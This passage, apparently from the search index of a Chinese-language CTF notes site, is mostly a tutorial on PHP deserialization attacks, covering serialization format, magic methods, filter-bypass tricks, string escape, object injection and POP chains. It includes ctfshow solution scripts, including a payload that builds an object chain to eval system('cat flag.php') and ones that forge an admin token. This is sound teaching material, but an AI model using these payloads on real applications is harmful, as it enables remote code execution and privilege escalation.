\"\u5f53\u524d\u7528\u6237\uff1a\" . $_SESSION['user'] . \"&lt;/br&gt;\";\n\n            $sql = 'UPDATE user SET photo = ? WHERE user = ?';\n            $stmt = mysqli_prepare($conn, $sql);\n            $stmt-&gt;bind_param('ss', $targetFile, $userId);\n            $stmt-&gt;execute();\n            $stmt-&gt;close();\n\n            if ($stmt-&gt;errno) {\n                die('\u5b58\u50a8\u5931\u8d25\uff1a' . $stmt-&gt;error);\n            } else {\n                echo \"\u5934\u50cf\u4e0a\u4f20\u6216\u8005\u4fee\u6539\u6210\u529f\uff01\";\n                echo \"e&lt;br&gt;&lt;a href=homepage.php&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;&lt;/br&gt;\";\n            }\n        } else {\n            echo \"\u5934\u50cf\u4e0a\u4f20\u5931\u8d25\uff01\";\n            echo \"e&lt;br&gt;&lt;a href=homepage.php&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;&lt;/br&gt;\";\n        }\n    }\n}\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#zhuxiaophp","title":"zhuxiao.php","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\n\nsession_start();\n$_SESSION['login'] = \"false\";\nsession_destroy();\nheader('location:index.html');\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"PHP\u53cd\u5e8f\u5217\u5316","text":""},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","title":"\u7b80\u4ecb","text":"<p>\u4ec0\u4e48\u662f\u5e8f\u5217\u5316\uff1f<code>serialize()</code></p> <p>\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u7b26\u4e32 \u4e3a\u4ec0\u4e48\u8f6c\u6362\uff1a1.\u6301\u4e45\u4fdd\u5b58\u30022.\u65b9\u4fbf\u7f51\u7edc\u4f20\u8f93\uff0c\u4f8b\u5982session\u7f13\u5b58\uff0ccookie\u7b49 </p> <p>\u4ec0\u4e48\u662f\u53cd\u5e8f\u5217\u5316\uff1f<code>unserialize()</code></p> <p>\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5bf9\u8c61</p> <p>Tip\uff1a\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5e8f\u5217\u5316\u540e\u662f\u5b83\u672c\u8eab\uff08ctfshow web260\uff09</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\nif (preg_match('/ctfshow_i_love_36D/', serialize($_GET['ctfshow']))) {\n    echo $flag;\n}\n//\u56e0\u6b64\u76f4\u63a5?ctfshow=/ctfshow_i_love_36D/ \u5373\u53ef\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","title":"\u5e38\u89c1\u7684\u5e8f\u5217\u5316\u683c\u5f0f","text":"<ul> <li>\u4e8c\u8fdb\u5236\u683c\u5f0f</li> <li>\u5b57\u8282\u6570\u7ec4</li> <li>json\u5b57\u7b26\u4e32</li> <li>xml\u5b57\u7b26\u4e32</li> </ul>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_3","title":"\u6848\u4f8b","text":""},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_4","title":"\u6570\u7ec4\u5e8f\u5217\u5316","text":"PHP<pre><code>&lt;?php\n$a = array('hello', 'hi');\n$a_ser = serialize($a);\necho $a_ser;\n?&gt;\n</code></pre> <p>\u7ed3\u679c\uff1a</p> Text Only<pre><code>a:2:{i:0;s:5:\"hello\";i:1;s:2:\"hi\";}\n</code></pre> Text Only<pre><code>2\uff1a\u8868\u793aa\u6709\u4e24\u4e2a\u5143\u7d20\ni\uff1a\u8868\u793aindex\uff1b0\uff1a\u8868\u793a\u4e0b\u68070\ns\uff1a\u8868\u793astring\u5b57\u7b26\u4e32\u6570\u7ec4\uff1b5\uff1a\u957f\u5ea6\u4e3a5\n</code></pre> <p>\u89e3\u6790</p> Text Only<pre><code>a - array\nb - boolean\nd - double\ni - integer\no - common object \nr - reference\ns - string\nC - custom object\nO - class\nN - null\nR - pointer reference\nU - unicode string\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_5","title":"\u5bf9\u8c61\u5e8f\u5217\u5316","text":"PHP<pre><code>&lt;?php\nclass Student\n{\n    public $name;\n    public $age;\n    function __construct()\n    {\n        $this-&gt;name = 'abab';\n        $this-&gt;age = 18;\n    }\n    function pr()\n    {\n        return $this-&gt;name;\n        return $this-&gt;age;\n    }\n}\n$stu = new Student();\n$stu_ser = serialize($stu);\necho $stu_ser\n?&gt;\n</code></pre> <p>\u7ed3\u679c</p> Text Only<pre><code>O:7:\"Student\":2:{s:4:\"name\";s:4:\"abab\";s:3:\"age\";i:18;}\n</code></pre> <p>\u6ce8\uff1a\u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9\u53ea\u6709\u6210\u5458\u53d8\u91cf\uff0c\u6ca1\u6709\u6210\u5458\u51fd\u6570</p> <p>\u8fd8\u6709\u4e00\u79cd\u6210\u5458\u53d8\u91cf\u5c31\u662fprotected\u7c7b\u578b</p> PHP<pre><code>&lt;?php\nclass test\n{\n    public $aa;\n    private $bb;\n    protected $cc;\n    function __construct()\n    {\n        $this-&gt;aa = 'aaa';\n        $this-&gt;bb = 'bbb';\n        $this-&gt;cc = 'ccc';\n    }\n}\n$d = new test();\n$d_ser = serialize($d);\necho $d_ser;\n?&gt;\n</code></pre> <p>\u5982\u679c\u662fprivate\u7c7b\u578b\uff0c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a<code>\\x00\u7c7b\u540d\\x00</code>\uff0c\u5982\u679c\u662fprotected\u7c7b\u578b\uff0c\u5219\u4f1a\u52a0\u4e0a<code>\\x00*\\x00</code>\uff0c \u8fd9\u4e9b\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26</p> <p>\u8f93\u51fa\u5219\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u89c1\u5b57\u7b26 <code>\\x00</code> \u7684\u4e22\u5931</p> <p>\u7ed3\u679c\uff1a\uff08\u4e0d\u6b63\u5e38\uff09</p> Text Only<pre><code>O:4:\"test\":3:{s:2:\"aa\";s:3:\"aaa\";s:8:\"testbb\";s:3:\"bbb\";s:5:\"*cc\";s:3:\"ccc\";}\n</code></pre> <p>\u5982\u679c\u9700\u8981\u672c\u5730\u5b58\u50a8\u63a8\u8350\u201curlencode\u201d</p> Text Only<pre><code>urlencode($d_ser);\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_6","title":"\u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u89c1\u7684\u9b54\u672f\u65b9\u6cd5","text":"Text Only<pre><code>__wakeup()      //\u6267\u884cunserialize()\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\n__sleep()       //\u6267\u884cserialize()\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\n__destruct()    //\u6790\u6784\u51fd\u6570\uff0c\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1\n__construct()   //\u6784\u9020\u51fd\u6570\uff0c\u5f53\u521b\u5efa\u5bf9\u8c61\u65f6\u81ea\u52a8\u8c03\u7528\u3002\n__call()        //\u5728\u5bf9\u8c61\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1\n__callStatic()  //\u5728\u9759\u6001\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1\n__get()         //\u7528\u4e8e\u4ece\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u6216\u8005\u4e0d\u5b58\u5728\u8fd9\u4e2a\u952e\u90fd\u4f1a\u8c03\u7528\u6b64\u65b9\u6cd5\n__set()         //\u7528\u4e8e\u5c06\u6570\u636e\u5199\u5165\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\n__isset()       //\u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u8c03\u7528isset()\u6216empty()\u89e6\u53d1\n__unset()       //\u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u4f7f\u7528unset()\u65f6\u89e6\u53d1\n__toString()    //\u628a\u7c7b\u5f53\u4f5c\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1\n__invoke()      //\u5f53\u5c1d\u8bd5\u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#trick","title":"\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u5c0fTrick","text":""},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php71","title":"php7.1+\u53cd\u5e8f\u5217\u5316\u5bf9\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f","text":"<p>\u6211\u4eec\u524d\u9762\u8bf4\u4e86\u5982\u679c\u53d8\u91cf\u524d\u662fprotected\uff0c\u5e8f\u5217\u5316\u7ed3\u679c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a<code>\\x00*\\x00</code></p> <p>\u4f46\u5728\u7279\u5b9a\u7248\u672c7.1\u4ee5\u4e0a\u5219\u5bf9\u4e8e\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\u5373\u4f7f\u6ca1\u6709<code>\\x00*\\x00</code>\u4e5f\u4f9d\u7136\u4f1a\u8f93\u51fa   <code>abc</code></p> PHP<pre><code>&lt;?php\nclass test\n{\n    protected $a;\n    public function __construct()\n    {\n        $this-&gt;a = 'abc';\n    }\n    public function __destruct()\n    {\n        echo $this-&gt;a;\n    }\n}\nunserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}');\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#__wakeup","title":"\u7ed5\u8fc7__wakeup","text":"<p>\u7248\u672c\uff1a \u2022 PHP5 &lt; 5.6.25 \u2022 PHP7 &lt; 7.0.10</p> <p>\u5229\u7528\u65b9\u5f0f\uff1a\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c</p> <p>\u4f8b\u5982\uff1a</p> PHP<pre><code>&lt;?php\nclass test\n{\n    public $a;\n    public function __construct()\n    {\n        $this-&gt;a = 'abc';\n    }\n    public function __wakeup()\n    {\n        $this-&gt;a = '666';\n    }\n    public function __destruct()\n    {\n        echo $this-&gt;a;\n    }\n}\n</code></pre> Text Only<pre><code>\u5982\u679c\u6267\u884cunserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}');\u8f93\u51fa\u7ed3\u679c\u4e3a666\n\n\u800c\u628a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u589e\u5927\uff1a\n\u6267\u884cunserialize('O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";}');\u8f93\u51fa\u7ed3\u679c\u4e3aabc\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_7","title":"\u7ed5\u8fc7\u90e8\u5206\u6b63\u5219","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a\u63cf\u8ff0\u4e86\u4e00\u79cd\u5b57\u7b26\u4e32\u5339\u914d\u7684\u6a21\u5f0f\uff08pattern\uff09\uff0c\u53ef\u4ee5\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u4e32\u662f\u5426\u542b\u6709\u67d0\u79cd\u5b50\u4e32\u3001\u5c06\u5339\u914d\u7684\u5b50\u4e32\u66ff\u6362\u6216\u8005\u4ece\u67d0\u4e2a\u4e32\u4e2d\u53d6\u51fa\u7b26\u5408\u67d0\u4e2a\u6761\u4ef6\u7684\u5b50\u4e32\u7b49\u3002</p> Text Only<pre><code>preg_match('/^O:\\d+/')\n//\u5339\u914d\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u662f\u5426\u662f\u5bf9\u8c61\u5b57\u7b26\u4e32\u5f00\u5934\n</code></pre> <p>\u5229\u7528\u52a0\u53f7\u7ed5\u8fc7\uff08\u5728url\u4f20\u53c2\u65f6\u6ce8\u610f+\u7f16\u7801\u4e3a<code>%2B</code>\uff09</p> <p><code>serialize(array(a))</code> a\u4e3a\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61(\u5e8f\u5217\u5316\u7ed3\u679c\u5f00\u5934\u662fa\uff0c\u4e0d\u5f71\u54cd\u4f5c\u4e3a\u6570\u7ec4\u5143\u7d20\u7684$a\u7684\u6790\u6784)</p> PHP<pre><code>&lt;?php\nclass test\n{\n    public $a;\n    public function __construct()\n    {\n        $this-&gt;a = 'abc';\n    }\n    public function __destruct()\n    {\n        echo $this-&gt;a . PHP_EOL;\n    }\n}\n\nfunction match($data){\n    if (preg_match('/^O:\\d+/',$data)){\n        die('you lose!');\n    }else{\n        return $data;\n    }\n}\n\n$a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}';\n// +\u53f7\u7ed5\u8fc7\n$b = str_replace('O:4', 'O:+4', $a);\nunserialize(match($b));\nserialize(array($a));\nunserialize('a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}}');\n\n?&gt;\n</code></pre> <p>\u5bf9\u5e94 ctfshow web258</p> <p>\u7f16\u5199\u811a\u672c\uff1a</p> PHP<pre><code>&lt;?php\nclass ctfShowUser\n{\n    public $username = 'xxxxxx';\n    public $password = 'xxxxxx';\n    public $isVip = false;\n    public $class = 'backDoor';\n    public function __construct()\n    {\n        $this-&gt;class = new backDoor();\n    }\n    public function __destruct()\n    {\n        $this-&gt;class-&gt;getInfo();\n    }\n}\nclass backDoor\n{\n    public $code = 'system(\"cat flag.php\");';\n    public function getInfo()\n    {\n        eval($this-&gt;code);\n    }\n}\n$a = new ctfShowUser();\n$a = serialize($a);\n$a = str_replace('O:', 'O:+', $a); //\u7ed5\u8fc7preg_match\necho urlencode($a);\n?&gt;\n//\u4e3b\u8981\u662f\u8c03\u7528backDoor\u6267\u884ceval\u547d\u4ee4\u51fd\u6570\u83b7\u53d6flag\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_8","title":"\u5229\u7528\u5f15\u7528","text":"PHP<pre><code>&lt;?php\nclass test\n{\n    public $a;\n    public $b;\n    public function __construct()\n    {\n        $this-&gt;a = 'abc';\n        $this-&gt;b = &amp;$this-&gt;a;\n    }\n    public function __destruct()\n    {\n        if ($this-&gt;a === $this-&gt;b) {\n            echo 666;\n        }\n    }\n}\n$a = serialize(new test());\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c06 <code>$b</code> \u8bbe\u7f6e\u4e3a <code>$a</code> \u7684\u5f15\u7528\uff0c\u53ef\u4ee5\u4f7f <code>$a</code> \u6c38\u8fdc\u4e0e <code>$b</code> \u76f8\u7b49</p> <p>\u5bf9\u5e94\u4e8ectfshow 265</p> <p>\u811a\u672c\u4ee3\u7801\uff1a</p> PHP<pre><code>&lt;?php\nclass ctfshowAdmin\n{\n    public $token;\n    public $password;\n    public function __construct($t, $p)\n    {\n        $this-&gt;token = $t;\n        $this-&gt;password = &amp;$this-&gt;token;\n    }\n    public function login()\n    {\n        return $this-&gt;token === $this-&gt;password;\n    }\n}\n\n$a = serialize(new ctfshowAdmin('123', '123'));\necho urlencode($a);\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#16","title":"16\u8fdb\u5236\u7ed5\u8fc7\u5b57\u7b26\u7684\u8fc7\u6ee4","text":"Text Only<pre><code>O:4:\"test\":2:{s:4:\"%00*%00a\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";}\n\u53ef\u4ee5\u5199\u6210\nO:4:\"test\":2:{S:4:\"\\00*\\00\\61\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";}\n\u8868\u793a\u5b57\u7b26\u7c7b\u578b\u7684s\u5927\u5199\u65f6\uff0c\u4f1a\u88ab\u5f53\u621016\u8fdb\u5236\u89e3\u6790\u3002\n61(16\u8fdb\u5236)-&gt;97(\u5341\u8fdb\u5236)-&gt;a(ASCII)\n</code></pre> PHP<pre><code>&lt;?php\nclass test\n{\n    public $username;\n    public function __construct()\n    {\n        $this-&gt;username = 'admin';\n    }\n    public function __destruct()\n    {\n        echo 666;\n    }\n}\nfunction check($data)\n{\n    if (stristr($data, 'username') !== False) {\n        echo (\"\u4f60\u7ed5\u4e0d\u8fc7\uff01\uff01\" . PHP_EOL);\n    } else {\n        return $data;\n    }\n}\n// \u672a\u4f5c\u5904\u7406\u524d\n$a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}';\n$a = check($a);\nunserialize($a);\n// \u505a\u5904\u7406\u540e \\75\u662fu\u768416\u8fdb\u5236\n$a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}';\n$a = check($a);\nunserialize($a);\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php_1","title":"PHP\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038","text":""},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1-x","title":"1. \u8fc7\u6ee4\u540e\u5b57\u7b26\u53d8\u591a\uff08\u53cd\u5e8f\u5217\u5316\u540e\u7684\u4e00\u4e2ax\u66ff\u6362\u6210\u4e3a\u4e24\u4e2a\uff09","text":"PHP<pre><code>&lt;?php\nfunction change($str)\n{\n    return str_replace(\"x\", \"xx\", $str);\n}\n\n$name = $_GET['name'];\n$age = \"I am 11\";\n$arr = array($name, $age);\necho \"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a\";\nvar_dump(serialize($arr));\necho \"&lt;br/&gt;\";\necho \"\u8fc7\u6ee4\u540e:\";\n$old = change(serialize($arr));\n$new = unserialize($old);\nvar_dump($new);\necho \"&lt;br/&gt;\u6b64\u65f6\uff0cage=$new[1]\";\n</code></pre> <p>\u6b63\u5e38\u8f93\u51fa\u5982\u4e0b</p> <p></p> <p>\u6dfb\u52a0\u4e00\u4e2ax\u770b\u770b\uff1a</p> <p></p> <p>\u8fd9\u4e2a\u5c31\u662f\u5c06GET\u4f20\u5165\u7684name\u4e2d\u7684 x \u6539\u4e3a\u4e86 xx</p> <p>\u6b63\u5e38\u4f20\u5165\u4e0d\u542bx\u7684name\u503c\u5c31\u4f1a\u6b63\u5e38\u663e\u793a</p> <p>\u4f8b\u5982\uff1a?name=mao\uff0c\u6b64\u65f6\u957f\u5ea6\u4e3a3</p> <p>\u5982\u679c\u6211\u4eec\u4f20\u5165maox\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4ed6\u7684\u957f\u5ea6\u5c31\u662f4\uff0c\u4f46\u662f\u7ecf\u8fc7change\u51fd\u6570\u7684\u66ff\u6362\uff0c\u53d8\u6210\u4e86abcxx\uff0c\u5bfc\u81f4\u6ea2\u51fa\uff08\u957f\u5ea6\u5927\u4e8e4\uff09\uff0c\u8fdb\u800c\u5f71\u54cd\u4e0b\u9762\u7684\u53cd\u5e8f\u5217\u5316</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u5b9e\u73b0\u5b57\u7b26\u4e32\u9003\u9038</p> <p>\u6784\u9020\uff1a</p> Text Only<pre><code>?name=abcxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"whoami\";}\n</code></pre> <p>\u8f93\u51fa\u5982\u4e0b\uff1a</p> <p>\u89e3\u91ca\uff1a</p> <p>\u5f53\u6211\u4eec\u6784\u9020name\u65f6\uff0c\u5728abc\u540e\u519918\u4e2ax\uff0c\u800c\u4e14\u540e\u9762 <code>\";i:1;s:4:\"flag\";}</code> \u4e5f\u662f18\u7684\u957f\u5ea6</p> <p>\u5728\u8fdb\u884cchange\u65f6\uff0c\u8fd9\u91cc\u768418\u4e2ax\u5c31\u53d8\u6210\u4e8636\u4e2ax\uff0c\u521a\u597d\u7b26\u5408\u5e8f\u5217\u5316\u65f6\u7684\u957f\u5ea6</p> <p>\u4ece\u800c\u9020\u6210<code>\";i:1;s:4:\"flag\";}</code>\u6ea2\u51fa\uff0c\u524d\u9762\u7684<code>\"</code>\u95ed\u5408\u524d\u4e32\uff0c\u540e\u9762\u7684<code>;}</code>\u95ed\u5408\u53cd\u5e8f\u5217\u5316\u7684\u5168\u8fc7\u7a0b</p> <p>\u800c\u5148\u524d\u5b58\u5728\u7684$age\u88ab\u820d\u5f03\uff08\u56e0\u4e3a\u8fd9\u91cc\u6570\u7ec4\u53ea\u6709\u4e24\u4e2a\u5143\u7d20\uff09\uff0c\u4e0d\u5f71\u54cd\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b</p> <p>\u603b\u4e4b\uff0cage\u53d8\u91cf\u88ab\u6211\u4eec\u63a7\u5236</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#2-x","title":"2. \u8fc7\u6ee4\u540e\u5b57\u7b26\u53d8\u5c11(\u628a\u53cd\u5e8f\u5217\u5316\u540e\u7684\u4e24\u4e2ax\u66ff\u6362\u6210\u4e3a\u4e00\u4e2a)","text":"PHP<pre><code>&lt;?php\nfunction change($str)\n{\n    return str_replace(\"xx\", \"x\", $str);\n}\n\n$arr['name'] = $_GET['name'];\n$arr['age'] = $_GET['age'];\necho \"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a\";\nvar_dump(serialize($arr));\necho \"&lt;br/&gt;\";\necho \"\u8fc7\u6ee4\u540e:\";\n$old = change(serialize($arr));\nvar_dump($old);\necho \"&lt;br/&gt;\";\n$new = unserialize($old);\nvar_dump($new);\necho \"&lt;br/&gt;\u6b64\u65f6\uff0cage=\";\necho $new['age'];\n</code></pre> <p>\u6b63\u5e38\u60c5\u51b5\u4f20\u5165<code>name=mao&amp;age=11</code>\u7684\u7ed3\u679c\uff1a</p> <p></p> <p>\u6784\u9020\uff1a</p> Text Only<pre><code>?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11\";s:3:\"age\";s:6:\"whoami\";}\n</code></pre> <p>\u8fd9\u91cc\u768440\u4e2ax\u7ecf\u8fc7\u6ee4\u540e\u5c31\u53d8\u4e3a\u4e8620\u4e2ax\uff0c\u4f46\u662f\u5728\u524d\u9762\u7684\u957f\u5ea6\u8fd8\u662f40\uff0c\u6240\u4ee5\u540e\u9762\u768420\u4e2a\u5b57\u7b26\u88ab\u201c\u5403\u6389\u201d</p> Text Only<pre><code>s:3:\"age\";s:28:\"11\";s:3:\"age\";s:6:\"woaini\";}\"\n</code></pre> <p>\u6ce8\u610f <code>\";s:3:\"age\";s:28</code>: \u8fd9\u4e00\u90e8\u5206\u672c\u6765\u5c31\u6709\uff0c\u540e\u9762\u7684 <code>;s:3:\"age\";s:6:\"whoami\";}</code> \u4e3a\u6211\u4eec\u6240\u6784\u9020\u7684</p> <p>age\u88ab\u6211\u4eec\u63a7\u5236</p> <p>ctfshow web262</p> <p>\u811a\u672c\uff1a</p> PHP<pre><code>&lt;?php\nclass message\n{\n    public $from;\n    public $msg;\n    public $to;\n    public $token = 'user';\n    public function __construct($f, $m, $t)\n    {\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\nfunction filter($msg)\n{\n    return str_replace('fuck', 'loveU', $msg);\n}\n$msg = new\nmessage('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuc\nkfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuc\nkfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuc\nkfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";}','b','c'\n);\n\n$msg_1 = serialize($msg);\n\necho $msg_1;\n\n$msg_2 = filter($msg_1);\n\necho $msg_2;\n\n//O:7:\"message\":4:\n{s:4:\"from\";s:310:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl\noveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl\noveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl\noveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl\noveUloveU\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";}\";s:3:\"ms\ng\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";}\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_9","title":"\u5bf9\u8c61\u6ce8\u5165","text":"<p>\u5f53\u7528\u6237\u7684\u8bf7\u6c42\u5728\u4f20\u7ed9\u53cd\u5e8f\u5217\u5316\u51fd\u6570 unserialize() \u4e4b\u524d\u6ca1\u6709\u88ab\u6b63\u786e\u7684\u8fc7\u6ee4\u65f6\u5c31\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002</p> <p>\u56e0\u4e3aPHP\u5141\u8bb8\u5bf9\u8c61\u5e8f\u5217\u5316\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u63d0\u4ea4\u7279\u5b9a\u7684\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\u7ed9\u4e00\u4e2a\u5177\u6709\u8be5\u6f0f\u6d1e\u7684 unserialize \u51fd\u6570</p> <p>\u6700\u7ec8\u5bfc\u81f4\u4e00\u4e2a\u5728\u8be5\u5e94\u7528\u8303\u56f4\u5185\u7684\u4efb\u610fPHP\u5bf9\u8c61\u6ce8\u5165\u3002</p> <p>\u524d\u63d0\u9700\u8981\u6ee1\u8db3\u4e24\u4e2a\u6761\u4ef6</p> Text Only<pre><code>1\u3001unserialize\u7684\u53c2\u6570\u53ef\u63a7\u3002\n2\u3001\u4ee3\u7801\u91cc\u6709\u5b9a\u4e49\u4e00\u4e2a\u542b\u6709\u9b54\u672f\u65b9\u6cd5\u7684\u7c7b\uff0c\u5e76\u4e14\u8be5\u65b9\u6cd5\u91cc\u51fa\u73b0\u4e00\u4e9b\u4f7f\u7528\u7c7b\u6210\u5458\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u7684\u5b58\u5728\u5b89\u5168\u95ee\u9898\u7684\u51fd\u6570\n</code></pre> PHP<pre><code>&lt;?php\nclass A\n{\n    public $test = \"12345\";\n    function __destruct()\n    {\n        echo $this-&gt;test;\n    }\n}\n$a = 'O:1:\"A\":1:{s:4:\"test\";s:5:\"23456\";}';\nunserialize($a);\n</code></pre> <p>\u811a\u672c\u7ed3\u675f\u65f6\u4f1a\u8c03\u7528<code>__destruct()</code>\u51fd\u6570\uff0c\u540c\u65f6\u4f1a\u8986\u76d6test\u53d8\u91cf\u8f93\u51fa 23456</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pop","title":"POP\u94fe\u7b80\u5355\u4ecb\u7ecd","text":"<p>\u524d\u9762\u6240\u8bb2\u89e3\u7684\u5e8f\u5217\u5316\u653b\u51fb\u66f4\u591a\u7684\u662f\u9b54\u672f\u65b9\u6cd5\u4e2d\u51fa\u73b0\u4e00\u4e9b\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u81ea\u52a8\u8c03\u7528\u800c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u4f46\u5982\u679c\u5173\u952e\u4ee3\u7801\u4e0d\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\uff0c\u800c\u662f\u5728\u4e00\u4e2a\u7c7b\u7684\u666e\u901a\u65b9\u6cd5\u4e2d\u3002\u8fd9\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u76f8\u540c\u7684\u51fd\u6570\u540d\u5c06\u7c7b\u7684\u5c5e\u6027\u548c\u654f\u611f\u51fd\u6570\u7684\u5c5e\u6027\u8054\u7cfb\u8d77\u6765</p> 